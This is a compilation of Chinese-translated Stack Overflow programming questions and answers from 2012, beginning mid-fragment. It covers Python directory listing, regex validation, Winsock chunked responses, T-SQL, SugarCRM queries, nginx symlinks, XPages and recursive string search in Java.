    document.getElementById('kioskform:broswerCloseSubmit').click();           
} 
```

# python - 获取给定目录中的子目录列表

> ID：12624324
> 
> 赞同：4
> 
> 时间：2012-09-27T14:58:58.033
> 
> 标签：python, python-2.7

我在获取列出给定目录中所有目录/子目录的 xml 结构时遇到了困难。我在[给定的帖子](https://stackoverflow.com/questions/2104997/os-walk-python-xml-representation-of-a-directory-structure-recursion)中使用递归来解决这个问题我的问题比平时更难。我的目录中可能包含 10000 个文件，因此检查每个内容以查看其是否为目录是否成本高昂，并且构建 xml 已经花费了很长时间。我只想为目录构建 xml。

我知道 linux 有一些命令，比如**find 。-type d**列出存在的目录（不是文件）。我怎样才能在python中实现这一点。

提前致谢。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-27T15:02:45.287

[`os.walk`](http://docs.python.org/library/os.html#os.walk)已经区分文件和目录：

```
def find_all_dirs(root='.'):
    for path,dirs,files in os.walk(root):
        for d in dirs:
            yield os.path.join(path, d) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-27T16:03:17.043

对于一个目录...

```
import os

def get_dirs(p):
  p = os.path.abspath(p)
  return [n for n in os.listdir(p) if os.path.isdir(os.path.join(p, n))]

print "\n".join(get_dirs(".")) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T18:17:24.707

这是我在搜索和尝试不同的事情后得到的解决方案。我并不是说这比查找目录中每个内容的方法更快，但它实际上产生的结果要快得多（当目录包含 1000 个文件时差异可见）

```
import os
import subprocess
from xml.sax.saxutils import quoteattr as xml_quoteattr

def DirAsLessXML(path):

    result = '<dir type ={0} name={1} path={2}>\n'.format(xml_quoteattr('dir'),xml_quoteattr(os.path.basename(path)),xml_quoteattr(path))

    list = subprocess.Popen(['find', path,'-maxdepth', '1', '-type', 'd'],stdout=subprocess.PIPE, shell=False).communicate()[0]

    output_list = list.splitlines()
    if len(output_list) == 1:
        result = '<dir type ={0} name={1} path={2}>\n'.format(xml_quoteattr('leaf_dir'),xml_quoteattr(os.path.basename(path)),xml_quoteattr(path))

    for item in output_list[1:]:
        result += '\n'.join('  ' + line for line in DirAsLessXML(item).split('\n'))
    result += '</dir>\n'
    return result 
```

# c# - 以阿拉伯格式导入 Excel 日期时间列

> ID：12624326
> 
> 赞同：0
> 
> 时间：2012-09-27T14:59:02.213
> 
> 标签：c#, excel, localization, import, arabic

我有一个类似于此处描述的问题：[如何将 DateTime.TryParse() 用于阿拉伯语等非英语语言？](https://stackoverflow.com/questions/5330885/how-do-i-use-datetime-tryparse-for-non-english-languages-like-arabic?rq=1#comment6020173_5330885) 但问题是解析的输入字符串来自excel文件。在 Windows 7 上测试时，字符串是用“لأ”字符编写的，但在 XP 上使用相同的区域设置进行测试时，我得到的字符串只包含“لا”符号。从对链接帖子的回答中，我看到“我认为阿拉伯 unicode 规范化（或类似的东西）存在一个小问题......我认为“星期三”这个词可以用两种方式编写......如果你尝试预期.ToString ("ddd dd MMMM yyyy", provider) 你会看到字符串看起来一样，但不是二进制相等的。你的第二个字符是 0x0627（阿拉伯字母 ALEF），ToString 一个是 0x0623（阿拉伯字母 ALEF WITH HAMZA ABOVE）“所以我的问题是 - 如何避免这种情况，我如何确定我得到了 .Net 期望的正确符号”

谢谢是提前

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-07-02T13:12:40.853

我们最终得到了硬编码的解决方案。当我们解析输入时，我们会检查这个符号并将其替换为 .net DateTime 解析器的预期值。

# eclipse - Tomcat java servlet 重定向到错误的 URL

> ID：12624330
> 
> 赞同：0
> 
> 时间：2012-09-27T14:59:09.140
> 
> 标签：eclipse, jsp, servlets, redirect, metadata

我有一个登录 servlet，它应该向指定的 url 发送重定向，但我似乎被发送到旧版本。我在 Eclipse 中使用 Tomcat 7，并认为它必须位于元数据中的某个地方。

```
response.sendRedirect("../xyz/home.jsp"); 
```

但我不会去 xyz/home.jsp，而是去 xyz1/home.jsp。

我有一个名为 xyz1 的旧项目，然后我做了一个折射器将名称更改为 xyz。现在看来登录 servlet 一直在引用 xyz1/home.jsp。我的其他链接很好，因为我使用的是 href 和相对路径。我对元数据进行了搜索，以查看是否有任何对 xyz1 的较旧引用，因此我更改了它们，并且还在我也修复的服务器配置文件中进行了搜索。不知道还有什么其他选择。谢谢，-汤米

调试器也有点没用，因为它通过无法读取的 .class 文件......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-01T13:28:08.130

我将 xyz 重命名为 xyz1，然后创建了一个名为 xyz 的空白项目。只移动了我的源文件并让元数据自行填充。为了安全起见，我还制作了一个新服务器。

# javascript - 正则表达式仅数字，破折号是可选的

> ID：12624335
> 
> 赞同：1
> 
> 时间：2012-09-27T14:59:39.900
> 
> 标签：javascript, regex

我正在尝试使用正则表达式制作一个 javascript 函数，该函数将验证电话号码。

规则是：
1\. 只有数字。2\. 超过 10 个号码。3\. 允许使用破折号 (-)（可选）。

首先，我尝试了这个：

```
 function validatePhone(phone) {

        var phoneReg = /[0-9]{10,}/;
        return (phoneReg.test(phone));
    } 
```

它仅适用于前 2 条规则，但不适用于破折号。

然后我尝试了`var phoneReg = /[-0-9]{10,}/;`，`var phoneReg = [\d]+\-?[\d]+`但后来javascript被破坏了......

有什么想法吗 ？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-27T15:02:04.360

这就是我处理电话号码验证的方式：

```
var validatePhone = function(phone) {

  // Stip everything but the digits.
  // People like to format phone numbers in all
  // sorts of ways so we shouldn't complain
  // about any of the formatting, just ensure the
  // right number of digits exist.
  phone = phone.replace(/\D/g, '');

  // They should have entered 10-14 digits.
  // 10 digits would be sans-country code,
  // 14 would be the longest possible country code of 4 digits.
  // Return `false` if the digit range isn't met.
  if (!phone.match(/\d{10,14}/)) return false;

  // If they entered 10, they have left out the country code.
  // For this example we'll assume the US code of '1'.
  if (phone.length === 10) phone = '1' + phone;

  // This is a valid number, return the stripped number
  // for reformatting and/or database storage.
  return phone;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-27T15:05:58.153

这应该有效。`-`角色需要转义。

```
var phoneReg = /[0-9-\-]{11,}/; 
```

这样做的潜在问题是，即使字符串中没有 10 个数字，具有多个破折号的字符串也会测试为正。我建议在测试之前替换破折号。

```
var phoneReg = /[0-9]{11,}/;
return (phoneReg.test(phone.replace(/\-/g, '')); 
```

# regex - 正则表达式只允许负数

> ID：12624336
> 
> 赞同：3
> 
> 时间：2012-09-27T14:59:43.863
> 
> 标签：regex

这听起来像是一个相当普遍的问题，但我搜索了很多，找不到任何有效的东西。我正在使用 jquery validate 插件来验证表单输入。有一个字段只需要接受负数（可以是整数或小数，但必须小于零）。

我试过做这样的事情：

```
 $.validator.addClassRules("negativeNumber", { range: [-1000000000, 0] }); 
```

...这很好，但验证错误很可怕（“请输入一个介于 -1000000000 和 0 之间的数字”） - 我只想说“请输入一个负数”。

谁能指出我只允许负数的正则表达式的方向？

非常感谢各位...

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-27T15:08:07.033

您可以添加[自定义验证方法](http://docs.jquery.com/Plugins/Validation/Validator/addMethod)，而不是正则表达式，我相信它更易于阅读。

```
$.validator.addMethod('negativeNumber',
    function (value) { 
        return Number(value) < 0;
    }, 'Enter a negative number'); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-27T15:01:59.373

我认为`\-\d*(\.?\d+)`会这样做。

`\-`匹配减号

`\d*`匹配零个或多个数字（考虑-.5之类的东西）

`\.?`匹配小数点（如果存在）

`\d*`匹配零个或多个数字

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-27T15:10:14.710

这将匹配任何小于 0`\-\d*(\.\d+)?`

包括 -.00001、-100000 和 -1

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-27T15:07:05.317

使用自定义验证方法会容易得多：

```
jQuery.validator.addMethod('negativeNumber', function(value, element) {
    return this.optional(element) || (+value < 0);
}, 'Please enter a negative number'); 
```

这比正则表达式更好（并且可能更快），让浏览器为您解析数字，而不是自己使用正则表达式。

* * *

或者，当然，使用该`max`方法，尽管那里的消息不太好。

# c++ - 获取网站源，获取额外符号，winsock

> ID：12624338
> 
> 赞同：0
> 
> 时间：2012-09-27T14:59:45.347
> 
> 标签：c++, sockets, winsock

您好，我的套接字有问题。我正在尝试获取网页源，我得到了我需要的一切，但是在响应标题和页面源之间我得到了一些额外的符号，**所以我的问题是**为什么我得到那些额外的符号。

我从某个地方得到那个“18ad”......

来源来自页面：

```
<..>
Server: Apache-Cloud
Transfer-Encoding: chunked
Date: Thu, 27 Sep 2012 14:46:43 GMT
Connection: close
X-Cache: M

18ad

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
    "http://www.w3.org/TR/xh
<..> 
```

十六进制视图：

```
 char: X-Cache: M......18ad...<!DO
    hex : 58 2D 43 61 63 68 65 3A 20 4D 0D 0D 0A 0D 0D 0A 31 38 61 64 0D 0D 0A 3C 21 44 4F 
```

请求头：

```
$GET / HTTP/1.1\r\n
Host: www.demotivation.us\r\n
Connection: close\r\n\r\n 
```

我的代码：

```
char*       ip  = "www.demotivation.us";
char*       url = "92.61.41.215";

<..>
sockAddr.sin_family = AF_INET;
sockAddr.sin_addr.s_addr = inet_addr(ip);
sockAddr.sin_port = htons(80);
<..>
s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
connect(s, (SOCKADDR*)&sockAddr, sizeof(SOCKADDR_IN);

<..>

// receive source to temporary buffer
do
{
    bytes = recv(s, buffer, BUFFER_SIZE, 0);
    buffer[bytes] = '\0';

    cout << buffer;
} while(bytes > 0); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T15:05:08.157

这`18ad`是*分块*编码方案的一部分。这意味着内容正在以几个*块*而不是一个块的形式下载。指示下一个块的`18ad`大小（在这种情况下为 6317 字节）。

有关说明，请参见[分块传输编码](http://en.wikipedia.org/wiki/Chunked_transfer_encoding)。

请注意，`recv()`可以在失败时返回`-1`，在用作数组索引之前应该对其进行检查。

# tsql - 从两个不同的表 T-SQL 中选择相同的列

> ID：12624339
> 
> 赞同：0
> 
> 时间：2012-09-27T14:59:44.957
> 
> 标签：tsql

我需要从两个不同的表中获取一个名为 SymNumber 的列。两者都将使用类似的标准进行选择。以下是我到目前为止的内容，但它不起作用......

```
DECLARE @date datetime

SELECT @date = LastChangeDate
FROM QueueUpdates

SELECT DISTINCT u.CompanyCode, u.AgentId 
FROM SymNumberToAgentId u, AgentIdToTradingPartner a, TradingPartner t, AgentContEd c 
WHERE u.SymNumber in 
(SELECT SymNumber FROM 
(SELECT a.SymeNumber, c.SymNumber 
FROM AgentProductTraining a, AgentContEd c 
WHERE a.LastChangeDate >= @date and c.LastChangeDate >= @date) a ) and 
u.AgentId = a.AgentId and a.TradingPartnerCode = t.TradingPartnerCode and t.TradingPartnerCode = 'SE2'

GO 
```

让我头疼的部分是下面列出的内部查询。我认为调整这部分将使我能够从两个表中获取 SymNum 列。

```
(SELECT SymetraNumber FROM 
(SELECT a.SymetraNumber, c.SymetraNumber 
FROM AgentProductTraining a, AgentContEd c 
WHERE a.LastChangeDate >= @date and c.LastChangeDate >= @date) a ) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-27T15:05:18.373

[`UNION`](http://msdn.microsoft.com/en-us/library/ms180026.aspx)或`UNION ALL`在这里看起来不错的选择：

```
(
    SELECT SymetraNumber 
    FROM AgentProductTraining a
    WHERE a.LastChangeDate >= @date 
    UNION
    SELECT SymetraNumber 
    FROM AgentContEd c 
    WHERE c.LastChangeDate >= @date
) 
```

# c# - 从矩阵中获取距今天最近的工作日（ddd 格式的工作日）

> ID：12624342
> 
> 赞同：1
> 
> 时间：2012-09-27T14:59:54.707
> 
> 标签：c#, datetime, dayofweek

当我被问到是否能找到一个简单的解决方案来解决工作中的问题时，我感到有点头疼。

这是目前的情况：

*   我们有一个日期（主要是今天的日期），我可以使用 dEarliest.ToString("ddd"); 轻松获取 Weekday 参数。
*   在数据库中，我们有一个特定任务将在哪一天执行的寄存器，工作日存储为“ddd”格式（即周一、周二、周三、周四等）。

而且，问题是，我怎样才能得到数据库记录中最接近今天的哪一天？我一直坐在这里试图通过一些“智能”SQL 查询来解决这个问题，但我只是不知道如何解决这个问题。

我在想枚举：s，但我不确定这是否可行，如果可行，如何？我对 c# 很陌生，因此可能是一个愚蠢的问题。

任何帮助将不胜感激。:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T18:24:17.950

最好的方法是在`DateTime`'`DayOfWeek`值（属性`DayOfWeek`类型为`enum DayOfWeek`）和 SQL Server`DATEPART`函数的输出之间进行比较。

例如，如果您想获取昨天的所有任务，您可以在 C# 中执行此操作：

`int yesterday = ((int)(DateTime.Now.DayOfWeek))-1;`

然后将该值传递给执行此操作的 SQL 语句：

`SELECT * FROM <table> WHERE DATEPART(weekday, <column_name>) = (@yesterday+1)`

这`@yesterday+1`部分是因为 C# 的枚举使用 0-6 表示天数，而 SQL Server 使用 1-7（两者都使用星期日作为第一个索引）。

# sql-server - SQL Server 2005 中的不可见外键

> ID：12624345
> 
> 赞同：2
> 
> 时间：2012-09-27T15:00:03.943
> 
> 标签：sql-server

我有一个脚本来通过检查外键的存在来更新数据库，如果它不存在，则创建它。它是由 SQL Management Studio 生成的。

```
IF NOT EXISTS (SELECT * FROM sys.foreign_keys WHERE object_id = OBJECT_ID(N'[dbo].[FK_tblChangeRequestForecast_tblCostingCenter]') AND parent_object_id = OBJECT_ID(N'[dbo].[tblChangeRequestForecast]'))
ALTER TABLE [dbo].[tblChangeRequestForecast]  WITH CHECK ADD  CONSTRAINT [FK_tblChangeRequestForecast_tblCostingCenter] FOREIGN KEY([CostingCenterID])
REFERENCES [dbo].[tblCostingCenter] ([CostingCenterID])
GO

IF  EXISTS (SELECT * FROM sys.foreign_keys WHERE object_id = OBJECT_ID(N'[dbo].[FK_tblChangeRequestForecast_tblCostingCenter]') AND parent_object_id = OBJECT_ID(N'[dbo].[tblChangeRequestForecast]'))
ALTER TABLE [dbo].[tblChangeRequestForecast] CHECK CONSTRAINT [FK_tblChangeRequestForecast_tblCostingCenter]
GO 
```

该脚本在运行时会引发错误：

```
The ALTER TABLE statement conflicted with the FOREIGN KEY constraint "FK_tblChangeRequestForecast_tblCostingCenter". The conflict occurred in database "mydatabase", table "dbo.tblCostingCenter", column 'CostingCenterID'. 
```

这是非常神秘的。就查询而言，没有外键的踪迹，但创建脚本失败并出现上述错误。服务器正在运行 SQL Server 2005 SP3 (9.00.4035.00)。

[更新]：我刚刚在 SQL Server 2012 实例上重现了该问题。所以版本似乎不太重要。

知道是什么原因造成的吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-27T15:45:52.940

它抱怨您尝试添加的 FK 约束，因为如果成功应用约束，表中的现有数据将不再有效。

可能意味着有一个或多个 ChangeRequestForecast 记录，其中 CostingCenterID 的值与 CostingCenter.CostingCenterID 不对应。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T15:24:20.370

打开 SSMS，转到该数据库，展开该表，然后查看“约束”部分。那里可能有一个名为“FK_tblChangeRequestForecast_tblCostingCenter”的内容，您需要确定是否需要，如果不需要，请将其删除。

# c# - 我有一个具有方法的项目列表，如何对所有项目执行此方法？

> ID：12624350
> 
> 赞同：2
> 
> 时间：2012-09-27T15:00:19.137
> 
> 标签：c#, list

假设我有一个 AwsomeClass 类的项目列表。这个类有一些属性`string StringA`和`string StringB`. 它还有一个方法`string AwesomeConcatenate()`（在这个基本示例中）简单地返回一个由两个属性组成的新字符串。

有没有办法使用 a为每个项目`List<AwesomeClass>`生成`List<string>`AwesomeConcatentate 的结果？

我知道我可以使用 foreach 来做到这一点（这就是我目前正在做的），但感觉应该有一个更简洁的方法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:02:23.987

您可以将 Linq 与*将序列的每个元素投影到新形式中的*`Select`方法一起使用。

 *```
var result = list.Select(ac => ac.AwesomeConcatenate()).ToList() 
```

MSDN在[这里](http://msdn.microsoft.com/en-us/library/bb548891.aspx)：

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T15:02:32.913

是的，这就是[LINQ](http://msdn.microsoft.com/en-us/library/bb397926.aspx)的用途！

```
var stringList = awesomeList.Select(x => x.AwesomeConcatenate()).ToList(); 
```

[`Select()`](http://msdn.microsoft.com/en-us/library/bb548891.aspx)通过将给定方法应用于源序列中的每个元素来创建新序列。*

# c# - 如何使用 C# 编辑 exe 存根？

> ID：12624353
> 
> 赞同：0
> 
> 时间：2012-09-27T15:00:23.007
> 
> 标签：c#

我怎样才能得到一个编译的 exe 存根，编码像这样的字符串 x="Hi"; Console.WriteLine(x);

并从另一个 c# 程序修改它（例如更改 x 的值）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:18:22.763

您可以使用[CodeDom](http://msdn.microsoft.com/en-us/library/y2k85ax6.aspx)动态编译代码字符串。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T15:19:14.287

如果文件已[签名](http://msdn.microsoft.com/en-us/library/ms537359%28v=vs.85%29.aspx)或具有[强名称](http://msdn.microsoft.com/en-us/library/wd40t7ad.aspx)，则您无法在没有访问私钥的情况下对其进行修改。否则篡改将是显而易见的。

假设参数没有存储在可执行文件之外，例如注册表或 app.config 文件中，这是相当困难的。一种方法是查看 IL 并使用[System.Reflection.Emit](http://msdn.microsoft.com/en-us/library/system.reflection.emit.aspx)命名空间或[CodeDom](http://msdn.microsoft.com/en-us/library/y2k85ax6.aspx)中的类来写出新的 EXE。

# javascript - 如何为 WinJS (WinRT) 创建自定义框架包

> ID：12624355
> 
> 赞同：2
> 
> 时间：2012-09-27T15:00:24.363
> 
> 标签：javascript, windows-8, windows-runtime, expression-blend, winjs

Visual Studio 2012 的项目模板包含一个包含 javascript、本地化文件和样式的参考包。

![WinJS 框架参考](../Images/12cb637a992c71c59d45d73229aca241.png)

我想知道的是如何使用我的代码、语言环境和样式构建自定义参考包。网上绝对没有这方面的信息，我尝试参考 MSDN，但它没有给我任何关于如何做到这一点的线索。请分享您可能拥有的任何有用信息。

事实证明，微软确实有[关于 Extension SDKs 的文档](http://msdn.microsoft.com/en-us/library/hh768146.aspx#ExtensionSDKs)。

**更新：**

我实际上设法获得了参考/框架包。除了在引用我的包的情况下打开 Expression Blend 之外，这一切都非常有效。请注意参考在那里，我实际上可以看到所有组件及其描述，但我仍然在设计表面上遇到错误。这是错误的样子（我知道，它非常具有描述性）： ![表达式与引用的自定义框架混合](../Images/a0406368235a26648d6d8932179daaaf.png)

**更新：**

当尝试部署引用我创建的框架包的应用程序时，我收到一个错误，说它找不到我的框架，而是找到了一些带有尾随符号的框架，而我在打包时没有放在那里。它附加了处理器架构以及包系列名称尾随符号。这是一个屏幕截图：

![在此处输入图像描述](../Images/c13a5fe96acb52a9cde1910f9a6e3aca.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T16:10:12.450

您正在查看的项目是“框架包”。虽然您可以生成一个看起来像框架包的包（查看 中的 WinJS 包的 appxmanifest.xml `\Program Files\WindowsApps`），但您无法将该包引入商店。

这是 Win8 不支持的——您需要在构建的每个包中包含所需的文件。

# sugarcrm - 从自定义模块访问数据库

> ID：12624357
> 
> 赞同：1
> 
> 时间：2012-09-27T15:00:38.277
> 
> 标签：sugarcrm

我正在尝试创建一个自定义模块，并且正在尝试获取我的 SQL 访问权限。

但我不断得到

> mysql_query() [function.mysql-query]：第 14 行 /home/scripts/public_html/crm/modules/PcPal/book-engineer.php 中用户 'scripts'@'localhost' 的访问被拒绝（使用密码：NO）

制作sugar模块时如何访问数据库中的数据？

```
<?php if(!defined('sugarEntry') || !sugarEntry) die ('Not A valid Entry point'); ?>

<h2>Book an Engineer</h2>

<form method="POST" >
Search Last Name : <input type="text"  name="frm_last_name_search" value="<?php echo $_POST['frm_last_name_search']; ?>" />

<input type="submit"  value="Search"/>
</form>

<?php
$sql = 'SELECT first_name, last_name, primary_address_street FROM contacts WHERE last_name = \''.$_POST['frm_last_name_search'].'\'';

$results = mysql_query($sql);

while($this_result = mysql_fetch_array($result))
{
  print_r($this_result);
}

?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:30:24.513

您应该考虑将 bean 方法用于此类非常常见的查询，因为它更容易且更便携。

[http://developers.sugarcrm.com/wordpress/2012/03/23/howto-using-the-bean-instead-of-sql-all-the-time/](http://developers.sugarcrm.com/wordpress/2012/03/23/howto-using-the-bean-instead-of-sql-all-the-time/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-27T15:10:08.870

使用该`global`对象`$db`执行数据库操作。
如果你有模块 bean eg: `$bean = new Contact();`，你可以使用`$bean->db`而不是`global $db`.
此外，在从表中获取时，始终使用`deleted = 0`, 因为已删除的项目被标记为`1`。

```
global $db;
$sql = "SELECT first_name, last_name, primary_address_street FROM contacts 
WHERE last_name = '{$db->quote($_POST['frm_last_name_search']}' AND deleted = 0";

$rs = $db->query($sql);

while($row = $db->fetchByAssoc($rs))
{
  print_r($row);
} 
```

# nginx - Nginx 不遵循符号链接

> ID：12624358
> 
> 赞同：39
> 
> 时间：2012-09-27T15:00:41.730
> 
> 标签：nginx, symlink

我已经在 Ubuntu 12.04 上安装了 nginx。但是，nginx 似乎不遵循符号链接。我知道这需要进行配置更改，但我无法找到在哪里进行更改。任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2013-03-07T05:40:20.623

在我的情况下`nginx`，已经配置为遵循符号链接。但问题是用户`nginx`无法访问我的主文件，因此指向我的主目录的符号链接不起作用。

### 例子

假设我们有符号链接`/usr/share/nginx/www/mylink`->`/home/u/html`

```
cd /usr/share/nginx/www
mkdir   -p  /home/u/html
sudo ln -sv /home/u/html mylink  # creates mylink -> /home/u/html 
```

### 授予权限

使用and授予**读取**和**执行**权限：[`chmod`](http://en.wikipedia.org/wiki/Chmod)[`find`](https://en.wikipedia.org/wiki/Find_(Unix))

```
chmod +rx /home/u
chmod +rw /home/u/html
find /home/u/html/php -type d -exec chmod +rx {} +
find /home/u/html/php -type d -exec chmod +w  {} +  # optional 
```

**笔记：**

1.  该权限`x`名为 e **x** ecute。但是当应用于目录时，此权限允许*递归目录树*（请参阅[Unix 模式](https://en.wikipedia.org/wiki/Modes_(Unix))）。

2.  该命令`find ... -exec chmod ...`递归地更改权限。我们也可以使用该命令`chmod -R +rx /home/myuser/html`，但最后一个命令还授予所有常规文件的*执行权限*，我们不希望这样。该选项仅对目录`-type d`执行。`chmod`

3.  如果您的 PHP 脚本需要写入数据，最后一个可选命令会授予*写入权限。*出于安全原因，尝试将写入权限限制为仅需要的目录。

### 测试

无需重启，只需在浏览器中`ngnix`按`Ctrl`+即可。`F5`

**注意：**不建议创建指向您的主目录的符号链接，因为读/写访问错误或错误的符号链接可能会暴露您的数字数据...

**参考：** [**nginx**](https://wiki.archlinux.org/index.php/Nginx#Error:_403_.28Permission_error.29)[上的 Arch wiki](https://wiki.archlinux.org/index.php/Nginx#Error:_403_.28Permission_error.29)

 *** * *

## 回答 #2

> 赞同：33
> 
> 时间：2012-09-27T15:16:55.420

[查看nginx 文档](http://nginx.org/en/docs/http/ngx_http_core_module.html#disable_symlinks)中的以下配置选项：

> 句法：
> 
> ```
> disable_symlinks off;
> disable_symlinks on |
> if_not_owner [from=part]; 
> ```
> 
> 默认值：disable_symlinks 关闭；
> 
> 上下文：http、服务器、位置
> 
> 该指令出现在版本 1.1.15 中。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-20T13:30:32.897

如果 olibre 的回答无济于事，请编辑文件 /etc/nginx/sites-available/default 并将此行添加到您指定服务器根目录的位置。

```
autoindex on; 
```

保存文件并重启服务器

```
/etc/init.d/nginx restart 
```**

# xpages - 视图面板找不到数据 var rowData - 未找到错误

> ID：12624360
> 
> 赞同：1
> 
> 时间：2012-09-27T15:00:47.283
> 
> 标签：xpages

我在选项卡式面板中有一个视图面板，其中 data > var 属性设置为 rowData。我将此视图设置为通过使用 viewScope 值来模拟单一类别视图。

当我打开 XPage 并单击视图面板所在的选项卡时，有时会弹出此错误（JavaScript 代码中的第 2 行是错误所在）：

* * *

```
Unexpected runtime error
The runtime has encountered an unexpected error.

Error source
Page Name:/speakerReq.xsp
Control Id: viewColumn2 

Exception
Error while executing JavaScript computed expression
Script interpreter error, line=2, col=23: [ReferenceError] 'rowData' not found 
```

JavaScript 代码

```
1: var href = facesContext.getExternalContext().getRequest().getContextPath();
**2: var docUNID = rowData.getDocument().getUniversalID();**
3: var formName = rowData.getDocument().getItemValueString("Form");
4: var formType = rowData.getColumnValue("Form")
5: 
6: if(formName == "clientProfile") {
7:  href + "/clientProfile.xsp?documentId=" + docUNID + "&action=openDocument&rtr=yes";
8: }
9: else {
10:     href + "/speakerProfile.xsp?documentId=" + docUNID + "&action=openDocument&rtr=yes";
11: } 
```

* * *

上面引用的 viewColumn2 是视图中具有以下公式的列：

```
@ReplaceSubstring(Form; "clientProfile" : "clientFeed" : "speakerProfile" : "speakerFeed"; "Client Profile" : "Client Feedback" : "Speaker Profile" : "Speaker Feedback") 
```

我不确定这将如何引发上述错误 --- 在大多数 XPages 上单击该选项卡都可以正常工作。

视图中显示的文档没有什么特别之处。我比较了其中两个——一个显示错误，一个抛出错误，我找不到任何会导致此问题的差异。

我无法确定为什么有时会出现错误，有时不会。

任何帮助都会很棒！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-14T13:18:38.390

尝试使用不同的变量名 curRowData ---并且不要忘记这些东西是区分大小写的。此外，您的代码是一个很大的内存泄漏，因为 rowData.getDocument 初始化了一个您不回收的 NotesDocument。

尝试使用：

```
var result;
if (curRowData.isCategory()) {
   return "";
}
var href = facesContext.getExternalContext().getRequest().getContextPath();
try {
   var doc = curRowData.getDocument();
   if (doc != null) {
      var docUNID = doc.getUniversalID();
      var formName = doc.getItemValueString("Form");
      var formType = curRowData.getColumnValue("Form")
          if(formName == "clientProfile") {
          result = href + "/clientProfile.xsp?documentId=" + docUNID + "&action=openDocument&rtr=yes";
      } else {
        result = href + "/speakerProfile.xsp?documentId=" + docUNID + "&action=openDocument&rtr=yes";
      }  
   }
} catch (e) {
  // some error handling
}
if (doc != null) {
   doc.recyle();
}
return result; 
```

当然，最好将所有需要的值添加到视图中。无需创建 NotesDocument 对象

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-28T04:35:39.917

如果视图已分类并且代码命中类别而不是文档，则可能会发生此错误。您可以使用以下代码确保当前行不是类别：

```
if (!rowdata.isCategory()) {
// insert your code here
} 
```

此代码当然假设 rowData 可用，因此这可能无法解决您的问题。

示例代码可在 Notes & Domino Application Development wiki 中找到： [http ://www-10.lotus.com/ldd/ddwiki.nsf/dx/notesxspviewentry_sample_javascript_code_for_xpages#isCategory+isDocument+isTotal](http://www-10.lotus.com/ldd/ddwiki.nsf/dx/notesxspviewentry_sample_javascript_code_for_xpages#isCategory+isDocument+isTotal)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-04T16:37:01.070

请添加对声明控件的 XML 的描述。我自己也遇到了这个错误，这是因为我以错误的方式计算了该列；“计算”与 JavaScript 我认为是……</p>

# java - java递归查找字符串中字符的最后一个索引

> ID：12624364
> 
> 赞同：3
> 
> 时间：2012-09-27T15:01:03.227
> 
> 标签：java, string, recursion

这是我所拥有的方法`lastIndexOf`，`ch`是要匹配的字符，并且`str`是源字符串。

```
public static int lastIndexOf(char ch, String str) {
    // check for null string or empty string
    if (str.length() == 0 || str == null) {
        return -1;
    }

    int indexInRest = lastIndexOf(ch, str.substring(1));
    char first = str.charAt(0);

    // recursive call to find the last matching character
    if (first == ch) {
        return 1 + indexInRest; // this might not work properly
    } else
        return indexInRest;
} 
```

如果在我班级的主要方法中我调用：

```
 System.out.println(lastIndexOf('r', "recurse"));
    System.out.println(lastIndexOf('p', "recurse")); 
```

我有：

```
1
-1 
```

期望的结果是：

```
4
-1 
```

建议，请。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-27T15:08:24.707

这必须是功课，因为 API 中存在 String.lastIndexOf() ，因此编写此方法没有意义，并且使用递归执行此操作会很慢并且会占用大量内存。

这里提示一下。现在，您的算法正在从前面切掉字符（ substring(1) ）并比较它们。lastIndexOf() 应该首先删除字符串后面的字符以寻找匹配项，然后在找到匹配项时退出。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-27T15:09:33.647

如何采用*功能*方法..

```
public static int lastIndexOf(char ch, String str) {
    if (str.charAt(str.length() - 1) == ch) { return str.length() -1; }
    if (str.length() <= 1) { return -1; }
    return lastIndexOf(ch, str.substring(0, str.length() - 1));
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T15:06:53.617

为什么不`String.lastIndexOf`这样使用：

```
str.lastIndexOf(ch) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-27T15:07:40.497

使用[`String#lastIndexOf(int ch)`](http://docs.oracle.com/javase/7/docs/api/java/lang/String.html#lastIndexOf%28int%29)实施作为一般准则，

```
public int lastIndexOf(int ch) {
    return lastIndexOf(ch, value.length - 1);
}

public int lastIndexOf(int ch, int fromIndex) {
    if (ch < Character.MIN_SUPPLEMENTARY_CODE_POINT) {
        // handle most cases here (ch is a BMP code point or a
        // negative value (invalid code point))
        final char[] value = this.value;
        int i = Math.min(fromIndex, value.length - 1);
        for (; i >= 0; i--) {
            if (value[i] == ch) {
                return i;
            }
        }
        return -1;
    } else {
        return lastIndexOfSupplementary(ch, fromIndex);
    }
}

